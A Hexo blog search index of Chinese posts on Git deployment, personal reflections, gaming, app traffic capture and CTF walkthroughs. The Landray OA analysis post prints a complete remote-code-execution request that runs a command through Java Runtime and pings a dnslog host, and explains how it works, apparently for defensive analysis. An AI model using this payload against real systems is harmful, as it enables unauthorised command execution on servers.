<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>关于重新部署博客的一点笔记</title>
    <link href="/2025/03/30/%E5%85%B3%E4%BA%8E%E9%87%8D%E6%96%B0%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E7%82%B9%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/03/30/%E5%85%B3%E4%BA%8E%E9%87%8D%E6%96%B0%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E7%82%B9%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="关于重新部署博客的一点笔记🤦🏻‍♂️"><a href="#关于重新部署博客的一点笔记🤦🏻‍♂️" class="headerlink" title="关于重新部署博客的一点笔记🤦🏻‍♂️"></a>关于重新部署博客的一点笔记🤦🏻‍♂️</h1><p>&emsp;&emsp;更换电脑后，之前配置好的环境全部重新构建，当时什么都备份了，唯独忘了将博客进行备份，加上长时间不操作Github很多步骤都遗忘，跟着DeepSeek越弄越麻烦，后来想起来还有一个Hexo的官方文档，于是乎直接删掉原来的仓库，重新建立并跟着官方文档一步步操作，这才将博客重新运作起来。所以这篇文章纯属是为了防止遗忘而记录的🤦🏻‍♂️</p><h2 id="Github-Hexo-fluid主题"><a href="#Github-Hexo-fluid主题" class="headerlink" title="Github + Hexo + fluid主题"></a>Github + Hexo + fluid主题</h2><h3 id="一、安装Hexo"><a href="#一、安装Hexo" class="headerlink" title="一、安装Hexo"></a>一、安装Hexo</h3><p>&emsp;&emsp;hexo的安装可以具体见Hexo的官方文档，上面都有很详细的教学，把Git、Node.js和npm安装完后，使用<code>npm install -g hexo-cli</code>命令对hexo进行安装。</p><h3 id="二、遇到的问题记录-只是我在部署的时候遇到的一些问题"><a href="#二、遇到的问题记录-只是我在部署的时候遇到的一些问题" class="headerlink" title="二、遇到的问题记录(只是我在部署的时候遇到的一些问题)"></a>二、遇到的问题记录(只是我在部署的时候遇到的一些问题)</h3><h4 id="2-1、已经下载了主题，但是主题并没有生效"><a href="#2-1、已经下载了主题，但是主题并没有生效" class="headerlink" title="2.1、已经下载了主题，但是主题并没有生效"></a>2.1、已经下载了主题，但是主题并没有生效</h4><p>&emsp;&emsp;1、使用npm命令下载hexo时，它默认的安装路径是在<code>\node_modules\hexo-theme-fluid</code>下，所以你需要将<code>\node_modules\hexo-theme-fluid</code>下的所有内容复制到你项目的根目录中一个名为<code>themes</code>文件夹下。</p><p>&emsp;&emsp;2、根据fluid的官方文档，还有一步很重要的操作就是需要在你项目的根目录下新建一个_config.fluid.yml文件，然后将<code>主题目录</code>中的<code>_config.yml</code>文件内容复制到刚刚建立的新的文件中，后续的配置增删改都在这个新文件中修改。</p><h4 id="2-2、关于Github推送时出现的问题"><a href="#2-2、关于Github推送时出现的问题" class="headerlink" title="2.2、关于Github推送时出现的问题"></a>2.2、关于Github推送时出现的问题</h4><p>&emsp;&emsp;1、在我使用<code>git commit -m &quot;修改博客中的一些配置&quot;</code>命令后，出现如下问题：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Author identity unknown<br><br>*** Please tell <span class="hljs-keyword">me</span> who you are.<br><br>Run<br><br>  git config --<span class="hljs-keyword">global</span> user.email <span class="hljs-string">&quot;you@example.com&quot;</span><br>  git config --<span class="hljs-keyword">global</span> user.name <span class="hljs-string">&quot;Your Name&quot;</span><br><br><span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> your account<span class="hljs-comment">&#x27;s default identity.</span><br>Omit --<span class="hljs-keyword">global</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> the identity only <span class="hljs-keyword">in</span> this repository.<br><br><span class="hljs-symbol">fatal:</span> unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">auto</span>-detect email address (got <span class="hljs-comment">&#x27;xxxx@DESKTOP-xxxx.(none)&#x27;)</span><br></code></pre></td></tr></table></figure><p>这是由于我在安装hexo和Git后没有及时配置我的邮箱和用户导致的问题，所以使用下面这两行命令进行全局配置，由于是个人使用，并不涉及团队仓库，所以直接全局配置比较方便。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git config <span class="hljs-attr">--global</span> user<span class="hljs-selector-class">.email</span> <span class="hljs-string">&quot;you@example.com&quot;</span><br>git config <span class="hljs-attr">--global</span> user<span class="hljs-selector-class">.name</span> <span class="hljs-string">&quot;Your Name&quot;</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;2、在使用命令<code>git push -u origin main</code>时出现:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">fatal: unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">access</span> <span class="hljs-string">&#x27;https://github.com/用户名/仓库名称/&#x27;</span>: Recv failure: Co<br>nnection was <span class="hljs-keyword">reset</span><br></code></pre></td></tr></table></figure><p>这是因为网络连接问题 或 GitHub 访问受限 导致的，所以我直接改用使用SSH进行连接和推送。</p><p>&emsp;&emsp;3、使用<code>git push -u origin main</code>后出现：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"> ! [rejected]        main -&gt; main (fetch <span class="hljs-keyword">first</span>)<br>error: failed <span class="hljs-built_in">to</span> push some refs <span class="hljs-built_in">to</span> <span class="hljs-string">&#x27;github.com:ROFGD/Myblog.git&#x27;</span><br>hint: Updates were rejected because <span class="hljs-keyword">the</span> remote <span class="hljs-keyword">contains</span> work that you <span class="hljs-built_in">do</span> <span class="hljs-keyword">not</span><br>hint: have locally. This is usually caused <span class="hljs-keyword">by</span> another repository pushing <span class="hljs-built_in">to</span><br>hint: <span class="hljs-keyword">the</span> same ref. If you want <span class="hljs-built_in">to</span> integrate <span class="hljs-keyword">the</span> remote changes, use<br>hint: <span class="hljs-string">&#x27;git pull&#x27;</span> <span class="hljs-keyword">before</span> pushing again.<br>hint: See <span class="hljs-keyword">the</span> <span class="hljs-string">&#x27;Note about fast-forwards&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;git push --help&#x27;</span> <span class="hljs-keyword">for</span> details.<br></code></pre></td></tr></table></figure><p>远程仓库（GitHub）有新的提交，而你的本地仓库没有同步，导致 Git 拒绝直接推送。由于我的是一个新的仓库，并且里面没有重要的内容，所以我的办法就是直接强制推送。如果原有仓库中有内容，并且还很重要，千万别强制推送！！！这会直接覆盖你仓库中原有的文件。</p><h4 id="2-3、关于访问的问题"><a href="#2-3、关于访问的问题" class="headerlink" title="2.3、关于访问的问题"></a>2.3、关于访问的问题</h4><p>&emsp;&emsp;我第一次在设置仓库名称是用的是<code>MyBlog</code>这个名称，导致我后面怎么都访问不了我的博客，后来发现如果要想访问，需要将仓库名称改为<code>用户名.github.io</code>这样设置完之后，同步更改项目<code>根目录</code>中的<code>_config.yml</code>，翻到最下面有个<code>deploy</code>选项，按照如下修改，由于我使用的是SSH连接，所以<code>repo</code>参数中填的是SSH的地址，如果用的是HTTPS连接，则需要填的是<code>https://github.com/xxxx/xxxxx.github.io</code></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">  type:</span> git<br><span class="hljs-symbol">  repo:</span> git@github.com:用户名/仓库名.git <br>  <span class="hljs-meta"># 例如，https:<span class="hljs-comment">//github.com/hexojs/hexojs.github.io</span></span><br><span class="hljs-symbol">  branch:</span> main<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024年终总结</title>
    <link href="/2025/01/22/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2025/01/22/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>​&emsp;&emsp;回顾整个2024年，有很多想说的东西，但是一时间真的不知道该从何说起，所以就想到哪说哪吧。工作上面，由于2023年本科毕业后在成都地铁站务员干的很无趣，所以干了3个月就跑路了，虽然是和成都地铁签的是正式合同，但是这工作对我来说真的很难受，不是说眼高手低那种，是属于精神上的难受。后来跑路后想了想自己出路就半路出家并借着大学时候对一些东西的研究和兴趣，一门心思扎进网安这个行业。再后来借某信的平台签了网安第一份工作–外包安服，也是借着安服第一次对网安这个行业有一点清晰的认识。在从2023年6月-2024年7月这一年的时间，除了拿工作练手以外，更多的是一些感悟。</p><ol><li><p>技术是永远学无止境的，并且这个东西我目前认为还是工作当中你需要什么你就学什么，然后利用其他时间把有关你用到技术的边边角角补充一下，形成一个相对完整的技术系统。</p></li><li><p>不管是在哪，只要是跟上班牵扯上的必须留痕，以免你跟老板或者客户扯皮的时候你毫无依据就很尴尬。</p></li><li><p>一旦客户给你提的问题你发现你解决不了，这时候你得先跟客户打个圆场，不能让客户感觉你菜，即使这活不在这个项目范围内，也要第一时间请外援，不论是你的项目经理还是销售有问题解决不了的直接摇人，然后同步打开谷歌、Bing、ChatGPT等一切工具。</p></li><li><p>我目前认为只要是在单位，对于不知道怎么跟人唠嗑的人(比如我)还是学会闭嘴，但是不能关闭耳朵和脑子，我感觉这是最能保命的手段，当然你也可以做一个捧哏。有些时候我发现一个捧哏的作用是不亚于逗哏的。</p></li><li><p>你可以说你菜，但是你不能真的菜。</p></li><li><p>有问题一定要及时、有效的沟通(刚工作的时候在这上面没少挨骂)。</p></li><li><p>干活的时候尽量麻利点，你可以按卡点交，但是不能卡点完成，因为你完成之后改动也是需要时间的。</p></li><li><p>都是出来上班挣钱，没有对错之分，只有利益是不是相同的</p></li><li><p>“正真的朋友”和”熟人“要学会区分。</p></li><li><p>出了校门，都是利益，如果在这个繁杂的社会上能碰见“一段友情”或者是“爱情”，那真的请认认真真的对待（虽然几率跟你中彩票的几率差不多）。</p></li><li><p>你可以表面上装傻啦吧唧的，但是你心里一定要有自己的想法和思考(你可以表面老实，但是你不能真的老实)。</p></li><li><p>出了问题先想“是我的问题吗”，然后再想“我能解决吗”如果不是你的问题，而且你也无法解决的，该吃吃该喝喝该耍耍，你忧虑和压力只能成为你身体的负担；要是是你的问题，但是以你的能力解决不了的，请场外求助同时偷偷观察大佬是怎么解决的然后请客吃饭。</p></li><li><p>有时候别那么死板，灵活多变一点没坏处。</p></li></ol><p>&emsp;&emsp;在工作的这段时间里，我很感谢我遇见的伙伴们，他&#x2F;她们对我都很Nice，相处的也十分的愉快。除了项目上的一些磕磕绊绊其他的都一切安好(可能跟我工作时间短有关吧👀👀👀)。同时呢也让我想明白一些东西(不是上面说的这些，有些东西还是不写进来为好)。这些东西虽然让我有时候有点很emmmmm，但是我想这应该就是成长所要接受的吧。</p><p>&emsp;&emsp;至于其他的，从6月份项目马上结束的时候，我就在谋划我下一步到底要干嘛，想来想去，我做了一个冒险的决定—脱产考研。当时跟家里沟通了一下，家里人对我考研行为是支持的，但是对我脱产考研这事是反对的，都在劝我边上班边考研。我也见过边上班边考研的大佬，我只能说我的脑子真的不允许我这么干，我是那种要干，我就一门心思的干，不干我碰都不带碰。学习这事只有周六周天或者今天不忙的时候我会干。要是今天键盘搓的飞起，那下了班真的就只剩睡觉了。这样算下来，我都不知道猴年马月能考上研。所以我毅然决然的在项目结束之后开启了脱产备考的日子，结果不出意外的话就是白给。不管怎么样，我还是好好打算在考一年，要是26考研没戏，我直接出去上班，考研这事以后就闭口不谈。考研嘛两次就行了，没必要三四战，这世上又不是考研一条道。我还是感觉积累工作经验是最重要的。虽然我考研的目的之一是想脱离外包。要是脱离不了那就只能慢慢干。顺便说一句，发明劳务派遣这东西的真该挂电线杆!!!!</p><p>&emsp;&emsp;总的来讲2024这一年对我而言是动荡的，也是算是一个低谷吧，肉眼可见的这个低谷期应该还会维持一年甚至还会很久。但是选择是自己做的，结果也要自己吃的。看着周围的朋友一个个事业和爱情都进入到发展阶段，回头再看看我一切都是一个个问号。要是让我一句话总结2024年并展望2025我现在也只能对自己说：“平常心~~~”</p>]]></content>
    
    
    <categories>
      
      <category>日常随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>年终总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析---蓝凌OA</title>
    <link href="/2023/04/15/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90---%E8%93%9D%E5%87%8COA/"/>
    <url>/2023/04/15/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90---%E8%93%9D%E5%87%8COA/</url>
    
    <content type="html"><![CDATA[<h3 id="蓝凌OA—恶意代码分析"><a href="#蓝凌OA—恶意代码分析" class="headerlink" title="蓝凌OA—恶意代码分析"></a>蓝凌OA—恶意代码分析</h3><h4 id="一、大致经过"><a href="#一、大致经过" class="headerlink" title="一、大致经过"></a>一、大致经过</h4><ul><li>进行护网前期资产排查的时候，在客户这边的登录系统上面发现蓝凌OA的一个漏洞，同时分析攻击数据包发现恶意代码<code>/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&amp;script=function test()&#123;return java.lang.Runtime&#125;;r=test();r.getRuntime().exec(&quot;ping -c 4 uftj1t.dnslog.cn&quot;)&amp;type=1</code>在路径后面拼上如上代码，在DNSlog平台上面即可查看受害服务器信息。</li></ul><h4 id="二、代码分析"><a href="#二、代码分析" class="headerlink" title="二、代码分析"></a>二、代码分析</h4><ul><li><code>s_bean=sysFormulaSimulateByJS</code>是一个参数，它的作用是用于指定服务端要执行的一段 Java 代码。具体来说，<code>sysFormulaSimulateByJS</code>是一个 Java 类，它的作用是解析传入的 JavaScript 代码并执行它。因此，<code>s_bean=sysFormulaSimulateByJS</code> 的含义是要将传入的 JavaScript 代码解析并执行，并将执行结果返回给客户端。通过这种方式，攻击者可以利用服务端漏洞，将恶意的 JavaScript 代码传递给服务端，从而实现对服务端的攻击。在这段代码中，传递给服务端的 JavaScript 代码是一个简单的函数调用，它的目的是获取 <code>Java Runtime</code> 对象并执行一个命令。</li><li><code>r=test()</code> 的作用是调用 <code>test</code> 函数并将其返回值赋值给变量 <code>r</code>。在 <code>test</code> 函数中，执行了一个简单的 JavaScript 代码，它的作用是返回 <code>Java Runtime</code> 对象。<code>Java Runtime</code>是一个表示 Java 应用程序运行时环境的对象，它提供了很多有用的方法和属性，例如可以通过 <code>Runtime.getRuntime().exec</code> 方法执行本地操作系统的命令。因此，通过获取 <code>Java Runtime</code> 对象，攻击者可以执行本地操作系统的命令，从而实现对服务端的攻击。<ul><li><code>r=test()</code> 的目的是获取 <code>Java Runtime</code> 对象，这是为了后续执行命令的操作做准备。由于获取 <code>Java Runtime</code> 对象需要在 Java 环境中进行，因此需要先在服务端执行一段 Java 代码来获取它。通过这种方式，攻击者可以利用服务端漏洞，获取 <code>Java Runtime</code> 对象并执行命令，从而实现对服务端的远程命令执行和控制。</li></ul></li><li><code>type=1</code> 是一个参数，它的作用是用于指定返回给客户端的数据类型。具体来说，<code>type=1</code> 表示返回的数据类型是字符串类型。在此之前，服务端已经执行了传入的 JavaScript 代码，并获取了 <code>Java Runtime</code> 对象并执行了命令。通过指定 <code>type=1</code>，服务端将命令的执行结果以字符串的形式返回给客户端。</li><li>“<code>ping -c 4 uftj1t.dnslog.cn</code>“是一个命令行命令，它的作用是向指定的域名<code>（uftj1t.dnslog.cn）</code>发送四个 ICMP 回显请求（也称为 ping），并显示每个请求的往返时间和状态。通常情况下，这个命令是用来测试计算机之间网络连接状态。</li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>蓝凌OA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>APP抓包</title>
    <link href="/2023/03/08/APP%E6%8A%93%E5%8C%85/"/>
    <url>/2023/03/08/APP%E6%8A%93%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h3 id="APP抓包"><a href="#APP抓包" class="headerlink" title="APP抓包"></a>APP抓包</h3><h4 id="一、Charles抓包步骤"><a href="#一、Charles抓包步骤" class="headerlink" title="一、Charles抓包步骤"></a>一、Charles抓包步骤</h4><ul><li>环境：Charles 4.6.3   逍遥模拟器</li><li>步骤：<ul><li>Charles中下载证书:<code>Help–&gt;SSL Proxying—&gt;Save Charles Root Certificate…</code></li><li>将证书保存到本地，然后将证书放入到与模拟器共享的文件夹下(路径无所谓，只要是与模拟器共享的文件夹就行)</li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202303081606177.png" alt="image-20230308160627308"></li><li>在模拟器的找到设置-&gt;安全-&gt;从SDK安装-&gt;找到刚刚存放证书的文件(我是放到音乐文件夹里，所以得在模拟器中找Music这个文件夹)</li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202303081611075.png" alt="image-20230308161109823"></li><li><img src="/.io//Users\ReadPond\AppData\Roaming\Typora\typora-user-images\image-20230308161126263.png" alt="image-20230308161126263"></li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202303081611688.png" alt="image-20230308161141735"></li><li>点击该文件进行安装即可</li></ul></li></ul><h4 id="二、Burp抓包"><a href="#二、Burp抓包" class="headerlink" title="二、Burp抓包"></a>二、Burp抓包</h4><ul><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202303081630868.png" alt="image-20230308163034121"></li><li>保存后，需要将证书后缀更改为<code>Burp.cer</code>，模拟器中无法识别<code>Burp.der</code>后缀，更改完后，安装与上面安装相同</li></ul><h4 id="三、抓包当中遇到的问题"><a href="#三、抓包当中遇到的问题" class="headerlink" title="三、抓包当中遇到的问题"></a>三、抓包当中遇到的问题</h4><ul><li>在模拟器中测试时，设置代理后，通过代理能正常访问浏览器，并且Burp中有数据包测试抓包正常情况下，打开某个APP后发现抓包工具中没有任何数据包返回，同时APP中有<code>网络连接失败</code>等相关网络提示。可能存在以下情况： <ul><li>此APP内部有反代理机制<ul><li>自身抓包应用</li><li>使用Proxifier PE转发<ul><li>大致原理：如果设置了系统代理app-&gt;代理服务器-&gt;burp-&gt;服务端，APP检查模拟器或者手机的代理设置，发现设置代理则会出现网络连接异常。但是如果使用Proxifier PE软件进行转发(app-&gt;Proxifier PE-&gt;本地burp-&gt;服务)，则不需要设置系统代理，相当于(模拟器的网络出口时通过本机进行的)将APP的流量流向Proxifier PE，通过Proxifier PE将流量传递出去。</li></ul></li></ul></li><li>证书问题，如果代理开的是http代理，但是APP数据走的是SLL&#x2F;https<ul><li>情况1，客户端不存在证书校验，服务器也不存在证书校验。</li><li>情况2，客户端存在校验服务端证书，服务器也不存在证书校验，单项校验。</li><li>情况3、客户端存在证书校验，服务器也存在证书校验，双向校验。<ul><li>抓包使用Burp等抓包工具时，证书使用的是抓包工具自身的证书，并不是APP本身的证书，所以双向校验时前后端证书不一致就会出现开了http代理app不能正常运行</li></ul></li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APP</tag>
      
      <tag>抓包</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界---Training-WWW-Robots</title>
    <link href="/2023/01/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C---Training-WWW-Robots/"/>
    <url>/2023/01/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C---Training-WWW-Robots/</url>
    
    <content type="html"><![CDATA[<h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>题目说明：访问链接后，将其翻译过来如图所示，说明这个是有关爬虫robots.txt文件的内容。</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301261159412.png"></p><p>所以，我的思路是先尝试访问robots.txt看看能不能找到什么信息，在网址后面拼上robots.txt得到如图内容：</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301261202472.png"></p><p>根据文件信息可以看到禁止了所有robots引擎访问f10g.php这个文件，但是允许Yandex搜索引擎访问除过f10g.php文件的所有内容，所以这里看看能不能尝试访问这个被禁止的文件(到了这里能拼在网址后面的只有那个被禁止的文件，所以先尝试拼一下，看能不能行)，访问后得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301261204350.png"></p>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对于XSS主机的一些看法</title>
    <link href="/2023/01/20/%E5%AF%B9%E4%BA%8EXSS%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9C%8B%E6%B3%95/"/>
    <url>/2023/01/20/%E5%AF%B9%E4%BA%8EXSS%E4%B8%BB%E6%9C%BA%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9C%8B%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>之前一直看网上说XSS这机子怎么怎么🐮，说实话在目下这个主机版本里面XSS的性能真不怎么样，就同家的XSX的性能都比XSS强，所以XSS就不能单拉性能而论。个人认为XSS存在的意义就是为了降低游玩3A游戏的入门门槛，让那些喜欢打游戏但是资金又不充足的人群也能够的到。所以对于御三家都有的玩家来说XSS在这部分人眼中确实是电子垃圾，但是对于穷游党来说XSS+XGP是当下最理想的选择，当初XSS买回来头脑很热，逢人就说这主机怎么狠，但是经过半年的冷静期，现在静下来想想XSS存在的意义不在于性能而是在于它降低了游玩的门槛(抛去手柄，这主机连一千五都不到，在配上西瓜皮，你能在上面畅玩很多著名的3A大作~~~这还要什么自行车🤣🤣🤣)。而且XSS设计的也是真的好看！！！！反正自从把主机买回来，自己的拯救者彻底沦为办公用的本子现在回头把这账算算，我的拯救者&#x3D;XSX+好一点显示器，甚至还有剩余😭😭😭</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301211113574.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>日常随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>主机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于游戏的理解</title>
    <link href="/2023/01/19/%E5%85%B3%E4%BA%8E%E6%B8%B8%E6%88%8F%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <url>/2023/01/19/%E5%85%B3%E4%BA%8E%E6%B8%B8%E6%88%8F%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>最近入手了一台XSS，人生的第一台主机，不得不说是真滴香🐮🐮🐮🐮🐮🐮。记得小学二三年级那会儿，真的很羡慕小伙伴手上的PS游戏机，当时玩的还是宝可梦和罪恶都市还有一个三国的什么游戏，所以那时候有事没事都去小伙伴那蹭游戏。后来应该是上六年级吧家里装了电脑，当时第一件事就是下穿越火线，那时候这游戏可不像现在这么😫这游戏在我那个时候真的受众程度不亚于LOL，也就是从这个时候开始慢慢接触“3A游戏”</p><p>当时我玩的第一个单机游戏就是《使命召唤1》毕竟预算有限，大屁股能带动这游戏还不卡还要啥自行车。关键是这游戏还是从三大妈上下的盗版。虽然是盗版那也玩着很开心，剧情先不说，就那种声临其境的战斗场面加上激情的配乐真的是肾上腺素拉满，那个时候也不懂什么射击手感，反正就刺激好玩就对了，况且这游戏的本子写的在那个年代算是比较出色的。也就导致当时放学回家第一件事就是先看家长在家没，没在家Ok开机！打仗!</p><p>再后来就开始愈发不可收拾《使命召唤》《荣誉勋章》《二战狙击手v5》《红警》(玩的很多，但是能记住的也就这些了)当时还有一个软件叫快玩(快游….忘了)盒子，里面集成了很多当时市面上最火的单机游戏还有一些老牌单机游戏。所以我借助那个软件，只要我电脑带的起来玩就对了。当我接触了这些单机游戏后，忽然就觉得，这网络游戏变得怎么就未如嚼蜡(🥬🐕不配玩网游)反正当时也尝试着跟小伙伴打网游，但是网游带来的体验我感觉真的不如单机带来的那种沉浸式体验好。在到大学换了拯救者，只要Steam,育碧打折，e宝送游戏，基本上游戏内容差不多的我都一个不拉的都入库。</p><p>不管怎么说，就打游戏这件事而言，我家里是举双手反对的，他们觉得你有打游戏的时间不如出去下楼耍，或者去学习怎么怎么样。以至于到现在家里人都认为我从来不打游戏或者就是偶尔偶尔打游戏那种。在家我打游戏都是背着他们偷偷打很少有光明正大的打(但是自从上班了，打游戏的时间真的很少)只是现在由于我上班了，所以我在家打游戏他们也就没那么反感，但是偶尔也会说。我上高中的时候就打游戏这个事情也跟父母商讨过，但是他们一致认为打游戏是百害而无一利，花钱买游戏更是脑子进水的行为。</p><p>现在我也在反思游戏真的有父母口中的百害而无一利吗？游戏真的到了过街老鼠人人喊打吗？？？就我的成长经历来看，游戏好像对于我来说好像没什么影响，要非说有影响的话就是我自小就成绩不好，但是这个确实不百分之白就说是游戏造成的。没上大学前我就喜欢玩，真的就是不喜欢学习，学不进去，只喜欢学自己感兴趣的东西。我个人感觉游戏就带给我的好像没有什么坏处，相反带来的好像都是好处。 我对计算机的好奇，毫不夸张的讲就是来源于游戏。自从开始打单机游戏之后，我一直对计算机这个神奇的东西都抱有好奇，甚至我高中我选择文科的时候我依然对计算机抱有强烈的兴趣。我上高中时候家里才给我配的手机，我拿到手第一件事就是翻墙上谷歌上油管看维基，当时在油管上面经常搜一些奇奇怪怪的东西也经常看国外的玩家通关游戏，那时候我的涉猎面已经不在限制于书本上的东西，以至于我在上大学的时候虽然学的托马斯小火车专业但是闲暇时候依然去蹭他们计算机的相关课程。虽然听的时候真的是昏昏欲睡，但是或多或少我不是一个电脑小白，大学那阵子做大作业，愣是熬了两天写拿最基础的java给大作业写了一个脚本出来。原本需要好几周的大作业一个下午不光自己搞完了，还个整个宿舍搞完了。大学又自己捣鼓云服务器，又捣鼓各种稀奇古怪的配置。。。我现在回看我的兴趣爱好，除了体育上面，剩下的都是跟计算机有关的。让我找对这些兴趣的起源，我除了游戏我找不到第二个起源点。                  </p><p>当我打那些大作的时候，就好像在读一本本半科幻半现实的小说。游戏策划带着你认识一个又一个全新的世界，虽然它是虚拟的，但是它也来源于生活，来源于现实，映射到我们每个人。每一个大作打完都能或多或少的感悟甚至思考。尤其是我在打完大表哥2，亚瑟最后的救赎，何西阿宁死也没有说出帮派的信息，马掌台里那个老兵一直对亚瑟的感谢，约翰时常念叨“我不经常提起他，但我经常想念他”。每个人物都是那么的真实，富有感情，有血有肉。也是这个游戏，让我忽然觉得“不是所有的游戏都配叫做游戏”。</p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301191456210.png" style="zoom:50%;"><p>啰里吧嗦说这么多，只是想传达一个观点，游戏没有那么可怕，游戏也没有百害而无一利，真正可怕的是人，是你怎么认为，它就是你眼中的那个样子。我不反对打游戏，相反我有时候是提倡打游戏，switch合家欢一家人饭后先闲暇时一起陪孩子快快乐乐的打游戏不比回家每个人抱着手机各自看各自的香？？反正现在就搞不懂，一说游戏就是各种骂，各种封杀，别问问就是游戏害的。。。。反正就挺魔幻😔</p>]]></content>
    
    
    <categories>
      
      <category>游戏体验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>游戏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackBox---Three</title>
    <link href="/2022/11/21/HackBox-Three/"/>
    <url>/2022/11/21/HackBox-Three/</url>
    
    <content type="html"><![CDATA[<h3 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h3><h5 id="一、问题"><a href="#一、问题" class="headerlink" title="一、问题"></a>一、问题</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">How many TCP ports are <span class="hljs-keyword">open</span>?<br><span class="hljs-number">2</span><br>What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">domain</span> <span class="hljs-keyword">of</span> the email address provided <span class="hljs-keyword">in</span> the &quot;Contact&quot; section <span class="hljs-keyword">of</span> the website?<br>thetoppers.htb<br><span class="hljs-keyword">In</span> the absence <span class="hljs-keyword">of</span> a DNS <span class="hljs-keyword">server</span>, which Linux file can we use <span class="hljs-keyword">to</span> resolve hostnames <span class="hljs-keyword">to</span> IP addresses <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> be able <span class="hljs-keyword">to</span> <span class="hljs-keyword">access</span> the websites that <span class="hljs-type">point</span> <span class="hljs-keyword">to</span> those 